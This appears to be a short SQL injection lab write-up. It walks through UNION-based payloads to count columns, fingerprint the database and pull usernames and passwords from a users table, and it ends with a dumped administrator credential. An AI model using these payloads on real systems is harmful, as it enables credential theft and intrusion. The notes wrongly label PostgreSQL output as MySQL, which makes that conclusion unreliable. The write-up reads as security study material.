SQLi - Product category filter

End goal: retrieve all usernames and passwords and login as administrator

Analysis:

1. Find the number of columns that the vulnerable is using:
' ORDER BY 1--  => not display on the page
' ORDER BY 2--  => display on the page
' ORDER BY 3--  => internal server error

2. Find which columns contains text
' UNION select 'a', NULL--
' UNION select NULL, 'a'--

3. Output data from other tables
' UNION select NULL, username from users-- 
' UNION select NULL, password from users-- 

#Find database:

' UNION select NULL, @@Version-- => error => not microsoft
'UNION select NULL, version()-- => PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit => mySQL


'UNION select NULL, username ||'~'||password from users--
- administrator
- lb1lgbtlyrvv5q9up37k
